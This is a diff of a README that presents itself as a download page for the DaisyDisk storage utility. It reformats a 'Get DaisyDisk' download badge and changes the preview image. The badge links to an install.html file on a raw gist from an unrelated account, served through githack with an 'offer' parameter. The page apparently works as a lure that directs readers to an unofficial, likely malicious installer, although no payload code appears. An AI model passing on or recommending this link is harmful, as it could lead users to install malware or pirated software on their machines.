@@ -1,6 +1,6 @@
 # DaisyDisk Download — Desktop Storage Utility
 
-[![Get DaisyDisk GitHub](https://img.shields.io/badge/Get%20DaisyDisk%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/jerrypoohston4/0070e6743f25bb2bb3a39ffeabc93440/raw/ff4a51cb904119d820cdd91a443739eda5c2e375/install.html?offer=DaisyDisk)
+<a href="https://gistcdn.githack.com/jerrypoohston4/0070e6743f25bb2bb3a39ffeabc93440/raw/ff4a51cb904119d820cdd91a443739eda5c2e375/install.html?offer=DaisyDisk"> <img src="https://img.shields.io/badge/Get%20DaisyDisk%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white" alt="Get DaisyDisk GitHub"> </a>
 
 ---
 
@@ -72,7 +72,7 @@ A: Yes, it is designed to operate across both desktop platforms.
 
 ## 🖼 Preview
 
-![DaisyDisk Preview](https://cdn3.macpaw.com/cdn-cgi/image/format=auto,quality=60,width=608,dpr=2/images/content/Screenshot%202022-04-27%20at%2018.05.59_1651132925.png)
+![DaisyDisk Preview](https://www.insanelymac.com/blog/wp-content/uploads/2025/07/daisydisk.jpg)
 
 ---
 
